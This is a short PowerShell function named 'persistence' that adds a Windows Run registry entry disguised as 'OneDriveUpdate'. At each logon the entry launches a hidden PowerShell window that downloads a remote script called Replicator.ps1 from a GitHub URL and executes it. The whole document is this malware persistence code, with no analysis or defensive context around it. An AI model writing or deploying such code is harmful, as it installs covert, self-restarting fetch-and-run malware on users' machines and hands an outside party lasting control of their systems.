function persistence{
  reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "OneDriveUpdate" /d "powershell.exe -NoP -W Hidden IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/josprou/Replicator/main/Replicator.ps1')" /t REG_SZ /f 
}
